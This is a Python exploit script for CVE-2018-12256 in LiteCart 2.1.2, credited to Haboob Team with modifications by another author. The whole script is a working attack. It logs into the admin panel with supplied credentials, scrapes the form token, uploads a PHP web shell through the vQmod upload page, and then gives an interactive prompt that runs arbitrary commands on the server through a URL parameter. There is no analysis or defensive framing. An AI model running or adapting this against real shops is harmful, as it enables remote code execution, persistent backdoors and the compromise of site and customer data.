# Exploit Author: Haboob Team
# Software Link: https://www.litecart.net/downloading?version=2.1.2
# Version: 2.1.2
# CVE : CVE-2018-12256


# Mods by github.com/p4yl0ad 
# "mods" , denotes modified content from the original script


#!/usr/bin/env python
import mechanize, cookielib, urllib2, requests, sys, argparse, random, string #mods

from cmd import Cmd #mods 
pooner = open('poone.php', 'r') #mods 

parser = argparse.ArgumentParser(description='LiteCart')
parser.add_argument('-t',
                    help='admin login page url - EX: https://IPADDRESS/admin/')
parser.add_argument('-p',
                    help='admin password')
parser.add_argument('-u',
                    help='admin username')
args = parser.parse_args()
if(not args.u or not args.t or not args.p):
    sys.exit("-h for help")
url = args.t
user = args.u
password = args.p

br = mechanize.Browser()
cookiejar = cookielib.LWPCookieJar()
br.set_cookiejar( cookiejar )
br.set_handle_equiv( True )
br.set_handle_redirect( True )
br.set_handle_referer( True )
br.set_handle_robots( False )
br.addheaders = [ ( 'User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' ) ]
response = br.open(url)
br.select_form(name="login_form")
br["username"] = user
br["password"] = password
res = br.submit()
response = br.open(url + "?app=vqmods&doc=vqmods")
one=""
for form in br.forms():
    one= str(form).split("(")
    one= one[1].split("=")
    one= one[1].split(")")
    one = one[0]
cookies = br._ua_handlers['_cookies'].cookiejar
cookie_dict = {}
for c in cookies:
    cookie_dict[c.name] = c.value
rand = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
files = {
        'vqmod': ("ohnoesyouvebeenpooned" + ".php", pooner, "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }



#mods by github.com/p4yl0ad
r = requests.get(url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=id") #mods

if r.status_code == 200: #mods
    print r.content #mods
    print "starting cmdloop big boi, get that w00t" #mods
   
if r.status_code == 404: #mods
    print "file not found, uploading to target" #mods
    response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict) #mods
    r = requests.get(url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=id") #mods
else: 
    print "Sorry something went wrong"





class loop(Cmd): #mods
    prompt="ayylmao > " #mods
    def default(self, params): #mods
        cmd_response = self.getfuktm8(params) #mods
        print(cmd_response) #mods

    def getfuktm8(self, cmd_response): #mods
        target = url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=" + cmd_response #mods
        cmd_response = requests.get(target) #mods
        try: #mods
            if cmd_response.status_code == 200: #mods
                return cmd_response.content #mods
        except: #mods
            return None #mods

loop().cmdloop() #mods
